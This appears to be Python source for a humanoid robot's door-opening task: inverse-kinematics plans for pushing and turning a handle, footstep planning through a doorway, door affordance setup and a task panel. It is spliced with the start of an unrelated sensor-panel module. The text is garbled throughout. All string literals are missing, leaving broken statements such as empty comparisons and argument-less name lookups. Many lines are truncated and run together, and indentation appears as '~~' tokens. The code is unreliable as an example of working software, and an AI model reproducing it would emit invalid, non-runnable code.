newPlan = self . ikPlanner . computePostureGoal ( startPose , endPose , ikParameters = ikParameters ) \n 
self . addPlan ( newPlan ) \n 
\n 
~~ def planDoorPushOpenTwist ( self ) : \n 
\n 
~~~ ikParameters = IkParameters ( usePointwise = False , maxDegreesPerSecond = 60 ) \n 
\n 
nonGraspingHand = if self . graspingHand == else \n 
\n 
startPose = self . getPlanningStartPose ( ) \n 
endPose = self . ikPlanner . getMergedPostureFromDatabase ( startPose , , , side = nonGraspingHand \n 
newPlan = self . ikPlanner . computePostureGoal ( startPose , endPose , ikParameters = ikParameters ) \n 
self . addPlan ( newPlan ) \n 
\n 
\n 
~~ def planHandlePush ( self ) : \n 
\n 
~~~ doorSide = 1 if self . graspingHand == else - 1 \n 
\n 
startPose = self . getPlanningStartPose ( ) \n 
linkFrame = self . ikPlanner . getLinkFrameAtPose ( self . ikPlanner . getHandLink ( ) , startPose ) \n 
\n 
finalGraspToReferenceTransfrom = transformUtils . concatenateTransforms ( \n 
[ self . ikPlanner . getPalmToHandLink ( self . graspingHand ) , linkFrame , \n 
self . doorHingeFrame . transform . GetInverse ( ) ] ) \n 
\n 
handlePushTransform = transformUtils . frameFromPositionAndRPY ( [ 0.0 , 0.0 , 0.0 ] , \n 
[ 0 , 0 , - doorSide * self . handlePushAngle doorHandlePushFrame = transformUtils . concatenateTransforms ( [ finalGraspToReferenceTransfrom , \n 
handlePushTransform , \n 
self . doorHingeFrame . transform ] ) \n 
\n 
vis . updateFrame ( doorHandlePushFrame , , parent = self . doorHandleAffordance , visible constraintSet = self . ikPlanner . planEndEffectorGoal ( startPose , self . graspingHand , \n 
doorHandlePushFrame ) \n 
\n 
constraintSet . ikParameters = IkParameters ( usePointwise = False , maxDegreesPerSecond = self . speedLow constraintSet . nominalPoseName = \n 
endPose , info = constraintSet . runIk ( ) \n 
constraints = constraintSet . constraints \n 
\n 
constraints . extend ( self . createHingeConstraint ( self . doorHingeFrame , [ 0.0 , 0.0 , 1.0 ] , \n 
self . ikPlanner . getHandLink ( side = self . graspingHand constraintSet . startPoseName ) ) \n 
constraints . append ( self . ikPlanner . createLockedBasePostureConstraint ( constraintSet . startPoseName #constraints.append(self.ikPlanner.createLockedBackPostureConstraint(constraintSet.startPoseName)) constraints . extend ( self . ikPlanner . createFixedFootConstraints ( constraintSet . startPoseName ) ) \n 
constraints . append ( self . ikPlanner . createLockedArmPostureConstraint ( constraintSet . startPoseName \n 
plan = constraintSet . runIkTraj ( ) \n 
\n 
self . addPlan ( plan ) \n 
\n 
~~ def planHandlePushLift ( self ) : \n 
\n 
~~~ self . planHandleTurn ( - self . handleTurnAngle ) \n 
\n 
\n 
#def planHandlePushLift(self): \n 
\n 
#self.ikPlanner.ikServer.usePointwise = False \n 
#self.ikPlanner.ikServer.maxDegreesPerSecond = 10 \n 
#self.ikPlanner.maxBaseMetersPerSecond = 0.01 \n 
\n 
#startPose = self.getPlanningStartPose() \n 
#constraintSet = self.ikPlanner.planEndEffectorGoal(startPose, self.graspingHand, self.doorHandlePushLiftFrame) #endPose, info = constraintSet.runIk() \n 
#plan = constraintSet.runIkTraj() \n 
\n 
#self.ikPlanner.ikServer.maxDegreesPerSecond = 30 \n 
#self.ikPlanner.maxBaseMetersPerSecond = 0.05 \n 
\n 
#self.addPlan(plan) \n 
\n 
\n 
~~ def planDoorTouch ( self ) : \n 
\n 
~~~ ikParameters = IkParameters ( usePointwise = False , maxDegreesPerSecond = self . speedHigh ) \n 
nonGraspingHand = if self . graspingHand == else \n 
\n 
startPose = self . getPlanningStartPose ( ) \n 
endPose = self . ikPlanner . getMergedPostureFromDatabase ( startPose , , , side = nonGraspingHand \n 
newPlan = self . ikPlanner . computePostureGoal ( startPose , endPose , ikParameters = ikParameters ) \n 
self . addPlan ( newPlan ) \n 
\n 
~~ def planHandlePushOpen ( self ) : \n 
\n 
~~~ startPose = self . getPlanningStartPose ( ) \n 
constraintSet = self . ikPlanner . planEndEffectorGoal ( startPose , self . graspingHand , self . doorHandlePushOpenFrame constraintSet . ikParameters = IkParameters ( usePointwise = False , \n 
maxDegreesPerSecond = self . speedLow , \n 
numberOfAddedKnots = 2 ) \n 
\n 
endPose , info = constraintSet . runIk ( ) \n 
plan = constraintSet . runIkTraj ( ) \n 
\n 
self . addPlan ( plan ) \n 
\n 
\n 
~~ def planFootstepsToDoor ( self ) : \n 
~~~ startPose = self . getPlanningStartPose ( ) \n 
goalFrame = self . doorHandleStanceFrame . transform \n 
request = self . footstepPlanner . constructFootstepPlanRequest ( startPose , goalFrame ) \n 
self . footstepPlan = self . footstepPlanner . sendFootstepPlanRequest ( request , waitForResponse = True \n 
\n 
~~ def planFootstepsThroughDoor ( self ) : \n 
~~~ startPose = self . getPlanningStartPose ( ) \n 
goalFrame = self . doorWalkFrame . transform \n 
request = self . footstepPlanner . constructFootstepPlanRequest ( startPose , goalFrame ) \n 
request . params . nom_step_width = 0.21 \n 
self . footstepPlan = self . footstepPlanner . sendFootstepPlanRequest ( request , waitForResponse = True rt . _addPlanItem ( self . footstepPlan , , rt . FootstepPlanItem ) \n 
\n 
\n 
~~ def setFootstepThroughDoorParameters ( self ) : \n 
\n 
~~~ bias = - 0.02 \n 
self . doorFootstepParams = FieldContainer ( \n 
leadingFoot = , \n 
preEntryFootWidth = - 0.12 + bias , \n 
preEntryFootDistance = - 0.6 , \n 
entryFootWidth = 0.07 + bias , \n 
entryFootDistance = - 0.26 , \n 
exitFootWidth = - 0.08 + bias , \n 
exitFootDistance = 0.12 , \n 
exitStepDistance = 0.3 , \n 
endStanceWidth = 0.26 , \n 
numberOfExitSteps = 1 , \n 
centerStepDistance = 0.26 , \n 
centerStanceWidth = 0.20 , \n 
centerLeadingFoot = \n 
) \n 
\n 
~~ def setTestingFootstepThroughDoorParameters ( self ) : \n 
~~~ self . doorFootstepParams = FieldContainer ( \n 
endStanceWidth = 0.26 , \n 
entryFootDistance = - 0.26 , \n 
entryFootWidth = 0.12 , \n 
exitFootDistance = 0.12 , \n 
exitFootWidth = - 0.12 , \n 
exitStepDistance = 0.3 , \n 
leadingFoot = , \n 
numberOfExitSteps = 1 , \n 
preEntryFootDistance = - 0.55 , \n 
preEntryFootWidth = - 0.12 \n 
) \n 
\n 
~~ def getRelativeFootstepsThroughDoorWithSway ( self ) : \n 
\n 
~~~ p = self . doorFootstepParams \n 
\n 
stepFrames = [ \n 
\n 
[ p . preEntryFootDistance , p . preEntryFootWidth , 0.0 ] , \n 
[ p . entryFootDistance , p . entryFootWidth , 0.0 ] , \n 
[ p . exitFootDistance , p . exitFootWidth , 0.0 ] , \n 
\n 
] \n 
\n 
for i in xrange ( p . numberOfExitSteps ) : \n 
\n 
~~~ sign = - 1 if ( i % 2 ) else 1 \n 
stepFrames . append ( [ p . exitFootDistance + ( i + 1 ) * p . exitStepDistance , sign * p . endStanceWidth / \n 
~~ lastStep = list ( stepFrames [ - 1 ] ) \n 
lastStep [ 1 ] *= - 1 \n 
stepFrames . append ( lastStep ) \n 
\n 
\n 
\n 
#for a,b in zip(stepFrames, stepFrames[1:]): \n 
#    print b[0] - a[0], b[1] - a[1] \n 
\n 
return FootstepRequestGenerator . makeStepFrames ( stepFrames , relativeFrame = self . doorGroundFrame \n 
\n 
~~ def getRelativeFootstepsThroughDoorCentered ( self ) : \n 
\n 
~~~ p = self . doorFootstepParams \n 
\n 
stepDistance = p . centerStepDistance \n 
stanceWidth = p . centerStanceWidth \n 
leadingFoot = p . centerLeadingFoot \n 
\n 
\n 
stepFrames = [ ] \n 
for i in xrange ( 30 ) : \n 
\n 
~~~ sign = - 1 if leadingFoot is else 1 \n 
if i % 2 : \n 
~~~ sign = - sign \n 
\n 
~~ stepX = ( i + 1 ) * stepDistance \n 
if stepX > 1.5 : \n 
~~~ stepX = 1.5 \n 
~~ stepFrames . append ( [ stepX , sign * stanceWidth / 2.0 , 0.0 ] ) \n 
\n 
if stepX == 1.5 : \n 
~~~ break \n 
\n 
~~ ~~ lastStep = list ( stepFrames [ - 1 ] ) \n 
lastStep [ 1 ] *= - 1 \n 
stepFrames . append ( lastStep ) \n 
\n 
stepFrames [ - 1 ] [ 1 ] = np . sign ( stepFrames [ - 1 ] [ 1 ] ) * ( p . endStanceWidth / 2.0 ) \n 
stepFrames [ - 2 ] [ 1 ] = np . sign ( stepFrames [ - 2 ] [ 1 ] ) * ( p . endStanceWidth / 2.0 ) \n 
\n 
return FootstepRequestGenerator . makeStepFrames ( stepFrames , relativeFrame = self . doorHandleStanceFrame \n 
\n 
~~ def planManualFootstepsTest ( self , stepDistance = 0.26 , stanceWidth = 0.26 , numberOfSteps = 4 , leadingFoot \n 
~~~ stepFrames = [ ] \n 
for i in xrange ( numberOfSteps ) : \n 
\n 
~~~ sign = - 1 if leadingFoot is else 1 \n 
if i % 2 : \n 
~~~ sign = - sign \n 
\n 
~~ stepFrames . append ( [ ( i + 1 ) * stepDistance , sign * stanceWidth / 2.0 , 0.0 ] ) \n 
\n 
~~ lastStep = list ( stepFrames [ - 1 ] ) \n 
lastStep [ 1 ] *= - 1 \n 
stepFrames . append ( lastStep ) \n 
\n 
stanceFrame = FootstepRequestGenerator . getRobotStanceFrame ( self . robotModel ) \n 
stepFrames = FootstepRequestGenerator . makeStepFrames ( stepFrames , relativeFrame = stanceFrame ) \n 
startPose = self . getPlanningStartPose ( ) \n 
\n 
helper = FootstepRequestGenerator ( self . footstepPlanner ) \n 
request = helper . makeFootstepRequest ( startPose , stepFrames , leadingFoot ) \n 
\n 
self . footstepPlanner . sendFootstepPlanRequest ( request , waitForResponse = True ) \n 
\n 
\n 
~~ def planFootstepsThroughDoorManual ( self ) : \n 
\n 
~~~ startPose = self . getPlanningStartPose ( ) \n 
#stepFrames, leadingFoot = self.getRelativeFootstepsThroughDoorWithSway() \n 
stepFrames , leadingFoot = self . getRelativeFootstepsThroughDoorCentered ( ) \n 
\n 
helper = FootstepRequestGenerator ( self . footstepPlanner ) \n 
request = helper . makeFootstepRequest ( startPose , stepFrames , leadingFoot , numberOfFillSteps = 2 \n 
self . footstepPlan = self . footstepPlanner . sendFootstepPlanRequest ( request , waitForResponse = True rt . _addPlanItem ( self . footstepPlan , , rt . FootstepPlanItem ) \n 
\n 
\n 
~~ def computeWalkingPlan ( self ) : \n 
~~~ startPose = self . getPlanningStartPose ( ) \n 
self . walkingPlan = self . footstepPlanner . sendWalkingPlanRequest ( self . footstepPlan , startPose , self . addPlan ( self . walkingPlan ) \n 
\n 
\n 
~~ def commitManipPlan ( self ) : \n 
~~~ self . manipPlanner . commitManipPlan ( self . plans [ - 1 ] ) \n 
\n 
~~ def fitDoor ( self , doorGroundFrame ) : \n 
~~~ om . removeFromObjectModel ( om . findObjectByName ( ) ) \n 
self . spawnDoorAffordance ( ) \n 
affordanceFrame = om . findObjectByName ( ) \n 
assert affordanceFrame is not None \n 
affordanceFrame . copyFrame ( doorGroundFrame ) \n 
\n 
om . findObjectByName ( ) . setProperty ( , False ) \n 
\n 
\n 
~~ def showDoorHandlePoints ( self , polyData ) : \n 
\n 
~~~ doorHandle = om . findObjectByName ( ) \n 
door = om . findObjectByName ( ) \n 
\n 
doorWidth = door . getProperty ( ) [ 1 ] \n 
doorAxes = transformUtils . getAxesFromTransform ( door . getChildFrame ( ) . transform ) \n 
doorOrigin = np . array ( door . getChildFrame ( ) . transform . GetPosition ( ) ) \n 
\n 
handleAxes = transformUtils . getAxesFromTransform ( doorHandle . getChildFrame ( ) . transform ) \n 
handleOrigin = np . array ( doorHandle . getChildFrame ( ) . transform . GetPosition ( ) ) \n 
\n 
doorSide = 1 if self . graspingHand == else - 1 \n 
\n 
polyData = segmentation . cropToLineSegment ( polyData , doorOrigin - doorAxes [ 0 ] * 0.02 , doorOrigin polyData = segmentation . cropToLineSegment ( polyData , doorOrigin , doorOrigin + doorAxes [ 1 ] * ( doorWidth polyData = segmentation . cropToLineSegment ( polyData , handleOrigin - handleAxes [ 2 ] * 0.1 , handleOrigin \n 
pointsName = \n 
existed = om . findObjectByName ( pointsName ) is not None \n 
obj = vis . updatePolyData ( polyData , pointsName , parent = doorHandle , color = [ 1 , 0 , 0 ] ) \n 
if not existed : \n 
~~~ obj . setProperty ( , 10 ) \n 
\n 
\n 
~~ ~~ def spawnDoorAffordance ( self ) : \n 
\n 
~~~ groundFrame = self . computeGroundFrame ( self . robotModel ) \n 
\n 
doorOffsetX = 0.7 \n 
doorOffsetY = 0.0 \n 
\n 
doorGroundFrame = transformUtils . frameFromPositionAndRPY ( [ doorOffsetX , 0.0 , 0.0 ] , [ 0.0 , 0.0 , doorGroundFrame . PostMultiply ( ) \n 
doorGroundFrame . Concatenate ( groundFrame ) \n 
\n 
stanceFrame = transformUtils . frameFromPositionAndRPY ( [ 0.0 , 0.0 , 0.0 ] , [ 0.0 , 0.0 , 0.0 ] ) \n 
stanceFrame . PostMultiply ( ) \n 
stanceFrame . Concatenate ( groundFrame ) \n 
\n 
doorWalkFrame = transformUtils . frameFromPositionAndRPY ( [ doorOffsetX + 0.6 , 0.0 , 0.0 ] , [ 0.0 , doorWalkFrame . PostMultiply ( ) \n 
doorWalkFrame . Concatenate ( groundFrame ) \n 
\n 
\n 
doorWidth = 36 * 0.0254 \n 
doorHeight = 81 * 0.0254 \n 
doorDepth = 0.5 * 0.0254 \n 
\n 
doorSide = 1 if self . graspingHand == else - 1 \n 
handleHeightFromGround = 35 * 0.0254 \n 
handleDistanceFromEdge = 1.625 * 0.0254 \n 
handleDistanceFromDoor = 1.75 * 0.0254 \n 
handleLength = 4.125 * 0.0254 \n 
handleDepth = 0.25 * 0.0254 \n 
\n 
doorJamWidth = 0.5 \n 
doorJamDepth = 4.5 * 0.0254 \n 
\n 
\n 
handleFrame = transformUtils . frameFromPositionAndRPY ( [ - handleDistanceFromDoor - doorDepth / 2.0 handleFrame . PostMultiply ( ) \n 
handleFrame . Concatenate ( doorGroundFrame ) \n 
\n 
\n 
doorFrame = transformUtils . frameFromPositionAndRPY ( [ 0.0 , 0.0 , doorHeight / 2.0 ] , [ 0.0 , 0.0 , 0.0 doorFrame . PostMultiply ( ) \n 
doorFrame . Concatenate ( doorGroundFrame ) \n 
\n 
\n 
leftDoorJamFrame = transformUtils . frameFromPositionAndRPY ( [ 0.0 , ( doorWidth / 2.0 + doorJamWidth leftDoorJamFrame . PostMultiply ( ) \n 
leftDoorJamFrame . Concatenate ( doorGroundFrame ) \n 
\n 
rightDoorJamFrame = transformUtils . frameFromPositionAndRPY ( [ 0.0 , - ( doorWidth / 2.0 + doorJamWidth rightDoorJamFrame . PostMultiply ( ) \n 
rightDoorJamFrame . Concatenate ( doorGroundFrame ) \n 
\n 
\n 
\n 
desc = dict ( classname = , Name = , \n 
pose = transformUtils . poseFromTransform ( handleFrame ) , Dimensions = [ handleDepth , handleLength handleAffordance = segmentation . affordanceManager . newAffordanceFromDescription ( desc ) \n 
\n 
desc = dict ( classname = , Name = , \n 
pose = transformUtils . poseFromTransform ( doorFrame ) , Dimensions = [ doorDepth , doorWidth , doorHeight doorAffordance = segmentation . affordanceManager . newAffordanceFromDescription ( desc ) \n 
\n 
desc = dict ( classname = , Name = , \n 
pose = transformUtils . poseFromTransform ( leftDoorJamFrame ) , Dimensions = [ doorJamDepth , doorJamWidth leftDoorJamAffordance = segmentation . affordanceManager . newAffordanceFromDescription ( desc ) \n 
\n 
desc = dict ( classname = , Name = , \n 
pose = transformUtils . poseFromTransform ( rightDoorJamFrame ) , Dimensions = [ doorJamDepth , doorJamWidth rightDoorJamAffordance = segmentation . affordanceManager . newAffordanceFromDescription ( desc ) \n 
\n 
\n 
doorGroundFrame = vis . showFrame ( doorGroundFrame , , parent = doorAffordance ) stanceFrame = vis . showFrame ( stanceFrame , , parent = doorAffordance ) \n 
\n 
doorWalkFrame = vis . showFrame ( doorWalkFrame , , visible = False , parent = doorAffordance \n 
\n 
doorFrame = doorAffordance . getChildFrame ( ) \n 
handleFrame = handleAffordance . getChildFrame ( ) \n 
\n 
leftDoorJamFrame = leftDoorJamAffordance . getChildFrame ( ) \n 
rightDoorJamFrame = rightDoorJamAffordance . getChildFrame ( ) \n 
\n 
self . doorFrameSync = vis . FrameSync ( ) \n 
self . doorFrameSync . addFrame ( doorGroundFrame ) \n 
self . doorFrameSync . addFrame ( stanceFrame , ignoreIncoming = True ) \n 
self . doorFrameSync . addFrame ( doorWalkFrame , ignoreIncoming = True ) \n 
self . doorFrameSync . addFrame ( doorFrame , ignoreIncoming = True ) \n 
self . doorFrameSync . addFrame ( leftDoorJamFrame , ignoreIncoming = True ) \n 
self . doorFrameSync . addFrame ( rightDoorJamFrame , ignoreIncoming = True ) \n 
\n 
self . doorHandleFrameSync = vis . FrameSync ( ) \n 
self . doorHandleFrameSync . addFrame ( doorFrame ) \n 
self . doorHandleFrameSync . addFrame ( handleFrame , ignoreIncoming = True ) \n 
\n 
\n 
self . findDoorHandleAffordance ( ) \n 
self . doorGroundFrame = doorGroundFrame \n 
self . doorHandleStanceFrame = stanceFrame \n 
self . doorWalkFrame = doorWalkFrame \n 
\n 
\n 
~~ def findDoorHandleAffordance ( self ) : \n 
\n 
~~~ self . doorHandleAffordance = om . findObjectByName ( ) \n 
self . doorHandleFrame = self . doorHandleAffordance . getChildFrame ( ) \n 
\n 
self . computeDoorHingeFrame ( ) \n 
self . computeDoorHandleGraspFrame ( ) \n 
#self.computeDoorHandleStanceFrame() \n 
\n 
\n 
~~ def getEstimatedRobotStatePose ( self ) : \n 
~~~ return np . array ( self . sensorJointController . getPose ( ) ) \n 
\n 
\n 
~~ def getPlanningStartPose ( self ) : \n 
~~~ if self . planFromCurrentRobotState : \n 
~~~ return self . getEstimatedRobotStatePose ( ) \n 
~~ else : \n 
~~~ if self . plans : \n 
~~~ return robotstate . convertStateMessageToDrakePose ( self . plans [ - 1 ] . plan [ - 1 ] ) \n 
~~ else : \n 
~~~ return self . getEstimatedRobotStatePose ( ) \n 
\n 
\n 
\n 
\n 
~~ ~~ ~~ ~~ class DoorImageFitter ( ImageBasedAffordanceFit ) : \n 
\n 
~~~ def __init__ ( self , doorDemo ) : \n 
~~~ ImageBasedAffordanceFit . __init__ ( self , numberOfPoints = 1 ) \n 
self . doorDemo = doorDemo \n 
\n 
~~ def fit ( self , polyData , points ) : \n 
~~~ stanceFrame = FootstepRequestGenerator . getRobotStanceFrame ( self . doorDemo . robotModel ) \n 
\n 
doorGroundFrame = segmentation . segmentDoorPlane ( polyData , points [ 0 ] , stanceFrame ) \n 
self . doorDemo . fitDoor ( doorGroundFrame ) \n 
self . doorDemo . showDoorHandlePoints ( polyData ) \n 
\n 
~~ ~~ class DoorTaskPanel ( TaskUserPanel ) : \n 
\n 
~~~ def __init__ ( self , doorDemo ) : \n 
\n 
~~~ TaskUserPanel . __init__ ( self , windowTitle = ) \n 
\n 
self . doorDemo = doorDemo \n 
\n 
self . fitter = DoorImageFitter ( self . doorDemo ) \n 
self . initImageView ( self . fitter . imageView ) \n 
\n 
self . addDefaultProperties ( ) \n 
self . addButtons ( ) \n 
self . addTasks ( ) \n 
\n 
~~ def addButtons ( self ) : \n 
\n 
~~~ self . addManualButton ( , self . doorDemo . spawnDoorAffordance ) \n 
self . addManualSpacer ( ) \n 
self . addManualButton ( , self . doorDemo . planFootstepsToDoor ) \n 
self . addManualButton ( , self . doorDemo . planFootstepsThroughDoor ) \n 
self . addManualSpacer ( ) \n 
self . addManualButton ( , self . doorDemo . planPreReach ) \n 
self . addManualButton ( , self . doorDemo . planTuckArmsPrePush ) \n 
self . addManualButton ( , self . doorDemo . planTuckArms ) \n 
self . addManualSpacer ( ) \n 
self . addManualButton ( , self . openPinch ) \n 
self . addManualButton ( , self . closePinch ) \n 
self . addManualSpacer ( ) \n 
self . addManualButton ( , self . doorDemo . planReach ) \n 
self . addManualButton ( , self . doorDemo . planUnReach ) \n 
self . addManualSpacer ( ) \n 
self . addManualButton ( , self . doorDemo . planPreChop ) \n 
self . addManualButton ( , self . doorDemo . planChop ) \n 
self . addManualButton ( , functools . partial ( self . doorDemo . planChop , deltaX = - 0.1 , deltaY self . addManualSpacer ( ) \n 
self . addManualButton ( , functools . partial ( self . doorDemo . planHandleTurn , 10 ) ) \n 
self . addManualButton ( , functools . partial ( self . doorDemo . planHandleTurn , - 10 ) ) \n 
self . addManualButton ( , self . doorDemo . planDoorPushOpenTwist ) \n 
self . addManualSpacer ( ) \n 
self . addManualButton ( , self . doorDemo . commitManipPlan ) \n 
self . addManualButton ( , self . doorDemo . stopPushing ) \n 
\n 
\n 
~~ def getSide ( self ) : \n 
~~~ return self . params . getPropertyEnumValue ( ) . lower ( ) \n 
\n 
~~ def openPinch ( self ) : \n 
~~~ rt . OpenHand ( side = self . getSide ( ) . capitalize ( ) , mode = ) . run ( ) \n 
\n 
~~ def closePinch ( self ) : \n 
~~~ rt . CloseHand ( side = self . getSide ( ) . capitalize ( ) , mode = ) . run ( ) \n 
\n 
~~ def addDefaultProperties ( self ) : \n 
~~~ self . params . addProperty ( , 0 , attributes = om . PropertyAttributes ( enumNames = [ , self . params . addProperty ( , self . doorDemo . preChopWidth , attributes = om . PropertyAttributes self . params . addProperty ( , self . doorDemo . preChopDepth , attributes = om . PropertyAttributes self . params . addProperty ( , self . doorDemo . preChopHeight , attributes = om . PropertyAttributes self . params . addProperty ( , self . doorDemo . chopDistance , attributes = om . PropertyAttributes self . params . addProperty ( , self . doorDemo . chopSidewaysDistance , attributes self . _syncProperties ( ) \n 
\n 
~~ def onPropertyChanged ( self , propertySet , propertyName ) : \n 
~~~ if propertyName == : \n 
~~~ self . taskTree . removeAllTasks ( ) \n 
self . addTasks ( ) \n 
~~ self . doorDemo . findDoorHandleAffordance ( ) \n 
self . _syncProperties ( ) \n 
\n 
~~ def _syncProperties ( self ) : \n 
~~~ self . doorDemo . graspingHand = self . params . getPropertyEnumValue ( ) . lower ( ) \n 
self . doorDemo . ikPlanner . reachingSide = self . doorDemo . graspingHand \n 
if hasattr ( self . doorDemo , ) : \n 
~~~ self . doorDemo . computeDoorHandleGraspFrame ( ) \n 
~~ self . doorDemo . chopDistance = self . params . getProperty ( ) \n 
self . doorDemo . chopSidewaysDistance = self . params . getProperty ( ) \n 
self . doorDemo . preChopWidth = self . params . getProperty ( ) \n 
self . doorDemo . preChopDepth = self . params . getProperty ( ) \n 
self . doorDemo . preChopHeight = self . params . getProperty ( ) \n 
\n 
~~ def addTasks ( self ) : \n 
\n 
# some helpers \n 
~~~ self . folder = None \n 
def addTask ( task , parent = None ) : \n 
~~~ parent = parent or self . folder \n 
self . taskTree . onAddTask ( task , copy = False , parent = parent ) \n 
~~ def addFunc ( func , name , parent = None ) : \n 
~~~ addTask ( rt . CallbackTask ( callback = func , name = name ) , parent = parent ) \n 
~~ def addFolder ( name , parent = None ) : \n 
~~~ self . folder = self . taskTree . addGroup ( name , parent = parent ) \n 
return self . folder \n 
\n 
\n 
~~ d = self . doorDemo \n 
\n 
self . taskTree . removeAllTasks ( ) \n 
side = self . params . getPropertyEnumValue ( ) \n 
\n 
############### \n 
# add the tasks \n 
\n 
# prep \n 
folder = addFolder ( ) \n 
addTask ( rt . CloseHand ( name = , side = ) ) \n 
addTask ( rt . CloseHand ( name = , side = ) ) \n 
\n 
\n 
\n 
\n 
# fit \n 
\n 
addTask ( rt . UserPromptTask ( name = , message = addTask ( rt . FindAffordance ( name = , affordanceName = ) ) \n 
addTask ( rt . SetNeckPitch ( name = , angle = 35 ) ) \n 
\n 
# walk \n 
folder = addFolder ( ) \n 
addTask ( rt . RequestFootstepPlan ( name = , stanceFrameName = addTask ( rt . UserPromptTask ( name = , message = ) addTask ( rt . CommitFootstepPlan ( name = , planName = addTask ( rt . WaitForWalkExecution ( name = ) ) \n 
\n 
# refit \n 
\n 
addTask ( rt . UserPromptTask ( name = , message = \n 
# set fingers \n 
addTask ( rt . OpenHand ( name = , side = side , mode = ) ) \n 
\n 
\n 
def addManipTask ( name , planFunc , userPrompt = False ) : \n 
\n 
~~~ folder = addFolder ( name ) \n 
addFunc ( planFunc , name = ) \n 
if not userPrompt : \n 
~~~ addTask ( rt . CheckPlanInfo ( name = ) ) \n 
~~ else : \n 
~~~ addTask ( rt . UserPromptTask ( name = , message = ~~ addFunc ( d . commitManipPlan , name = ) \n 
addTask ( rt . WaitForManipulationPlanExecution ( name = ) ) \n 
\n 
\n 
~~ addManipTask ( , d . planPreReach , userPrompt = False ) \n 
addManipTask ( , d . planDoorTouch , userPrompt = False ) \n 
if d . usePinchGrasp : \n 
~~~ addManipTask ( , d . planReach , userPrompt = True ) \n 
addFunc ( self . closePinch , name = ) \n 
addTask ( rt . UserPromptTask ( name = , \n 
message = ) ) \n 
addManipTask ( , d . planHandleTurn , userPrompt = False ) \n 
addTask ( rt . UserPromptTask ( name = , \n 
message = ) ) \n 
~~ else : \n 
~~~ addFunc ( self . doorDemo . setChopParametersToDefaults , name = ) \n 
addFunc ( self . closePinch , name = ) \n 
addManipTask ( , d . planReach , userPrompt = True ) \n 
addManipTask ( , d . planChop , userPrompt = True ) \n 
\n 
~~ addManipTask ( , d . planHandlePush , userPrompt = False ) \n 
addTask ( rt . UserPromptTask ( name = , \n 
message = ) ) \n 
addManipTask ( , d . planHandlePush , userPrompt = False ) \n 
\n 
if d . usePinchGrasp : \n 
~~~ addManipTask ( , d . planHandlePushLift , userPrompt = False ) \n 
addTask ( rt . CloseHand ( name = , side = side , mode = , amount = 0 ) ) \n 
\n 
~~ addManipTask ( , d . planDoorPushOpen , userPrompt = False ) \n 
addTask ( rt . UserPromptTask ( name = , \n 
message = ) ) \n 
addTask ( rt . CloseHand ( name = , side = side ) ) \n 
addManipTask ( , d . planTuckArms , userPrompt = False ) \n 
addTask ( rt . CloseHand ( name = , side = side ) ) \n 
\n 
# walk \n 
folder = addFolder ( ) \n 
addFunc ( d . planFootstepsThroughDoorManual , name = ) \n 
addTask ( rt . UserPromptTask ( name = , message = ) addTask ( rt . CommitFootstepPlan ( name = , planName = ) addTask ( rt . WaitForWalkExecution ( name = ) ) \n 
\n 
\n 
folder = addFolder ( ) \n 
addTask ( rt . CloseHand ( name = , side = ) ) \n 
addTask ( rt . CloseHand ( name = , side = ) ) \n 
addTask ( rt . PlanPostureGoal ( name = , postureGroup = , postureName = addTask ( rt . UserPromptTask ( name = , message = ) ) \n 
addTask ( rt . CommitManipulationPlan ( name = , planName = addTask ( rt . WaitForManipulationPlanExecution ( name = ) ) \n 
\n 
~~ ~~ import PythonQt \n 
from PythonQt import QtCore , QtGui , QtUiTools \n 
from director import lcmUtils \n 
from director import applogic as app \n 
from director . utime import getUtime \n 
from director . timercallback import TimerCallback \n 
\n 
import numpy as np \n 
import math \n 
from time import time \n 
from copy import deepcopy \n 
\n 
def addWidgetsToDict ( widgets , d ) : \n 
\n 
~~~ for widget in widgets : \n 
~~~ if widget . objectName : \n 
~~~ d [ str ( widget . objectName ) ] = widget \n 
~~ addWidgetsToDict ( widget . children ( ) , d ) \n 
\n 
~~ ~~ class WidgetDict ( object ) : \n 
\n 
~~~ def __init__ ( self , widgets ) : \n 
~~~ addWidgetsToDict ( widgets , self . __dict__ ) \n 
\n 
\n 
~~ ~~ class SpindleSpinChecker ( object ) : \n 
\n 
~~~ def __init__ ( self , spindleMonitor ) : \n 
\n 
~~~ self . spindleMonitor = spindleMonitor \n 
self . timer = TimerCallback ( targetFps = 3 ) \n 
self . timer . callback = self . update \n 
self . warningButton = None \n 
self . action = None \n 
\n 
~~ def update ( self ) : \n 
~~~ if abs ( self . spindleMonitor . getAverageSpindleVelocity ( ) ) < 0.2 : \n 
~~~ self . notifyUserStatusBar ( ) \n 
~~ else : \n 
~~~ self . clearStatusBarWarning ( ) \n 
\n 
~~ ~~ def start ( self ) : \n 
~~~ self . action . checked = True \n 
self . timer . start ( ) \n 
\n 
~~ def stop ( self ) : \n 
~~~ self . action . checked = False \n 
self . timer . stop ( ) \n 
\n 
~~ def setupMenuAction ( self ) : \n 
~~~ self . action = app . addMenuAction ( , ) \n 
self . action . setCheckable ( True ) \n 
self . action . checked = self . timer . isActive ( ) \n 
self . action . connect ( , self . onActionChanged ) \n 
\n 
~~ def onActionChanged ( self ) : \n 
~~~ if self . action . checked : \n 
~~~ self . start ( ) \n 
~~ else : \n 
~~~ self . stop ( ) \n 
\n 
~~ ~~ def clearStatusBarWarning ( self ) : \n 
~~~ if self . warningButton : \n 
~~~ self . warningButton . deleteLater ( ) \n 
self . warningButton = None \n 
\n 
~~ ~~ def notifyUserStatusBar ( self ) : \n 
~~~ if self . warningButton : \n 
~~~ return \n 
~~ self . warningButton = QtGui . QPushButton ( ) \n 
self . warningButton . setStyleSheet ( "background-color:red" ) \n 
app . getMainWindow ( ) . statusBar ( ) . insertPermanentWidget ( 0 , self . warningButton ) \n 
\n 
~~ ~~ class MultisensePanel ( object ) : \n 
\n 
~~~ def __init__ ( self , multisenseDriver ) : \n 
\n 
~~~ self . multisenseDriver = multisenseDriver \n 
self . multisenseChanged = False \n 
\n 
loader = QtUiTools . QUiLoader ( ) \n 
uifile = QtCore . QFile ( ) \n 
assert uifile . open ( uifile . ReadOnly ) \n 
\n 
self . widget = loader . load ( uifile ) \n 
\n 
self . ui = WidgetDict ( self . widget . children ( ) ) \n 
\n 
self . updateTimer = TimerCallback ( targetFps = 2 ) \n 
self . updateTimer . callback = self . updatePanel \n 
self . updateTimer . start ( ) \n 
\n 
self . widget . headCamGainSpinner . setEnabled ( False ) \n 
self . widget . headCamExposureSpinner . setEnabled ( False ) \n 
\n 
#connect the callbacks \n 
self . widget . spinRateSpinner . valueChanged . connect ( self . spinRateChange ) \n 
self . widget . scanDurationSpinner . valueChanged . connect ( self . scanDurationChange ) \n 
